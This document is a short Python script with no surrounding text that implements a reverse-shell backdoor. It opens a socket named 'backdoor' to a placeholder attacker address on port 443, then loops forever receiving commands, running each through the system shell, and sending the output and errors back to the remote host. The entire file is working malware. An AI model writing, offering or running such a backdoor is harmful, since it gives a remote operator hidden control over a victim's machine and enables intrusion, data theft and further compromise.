import socket
import subprocess


server_ip = 'XXXX'
port = 443
backdoor = socket.socket()
backdoor.connect((server_ip, port))

while True:
    command = backdoor.recv(1024)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    backdoor.send(output + output_error)
